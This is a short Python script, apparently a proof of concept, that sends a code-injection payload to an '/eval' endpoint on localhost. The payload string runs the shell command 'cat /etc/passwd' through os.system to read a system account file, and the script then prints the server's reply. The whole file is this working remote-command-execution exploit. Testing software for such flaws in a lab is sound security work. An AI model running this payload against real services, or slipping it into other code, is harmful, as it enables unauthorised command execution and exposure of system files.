import requests


url = 'http://localhost/eval'
shellcode = "__import__('os').system('cat /etc/passwd')"

data = {'input_data': shellcode}

response = requests.post(url, data=data)

print(response.text)
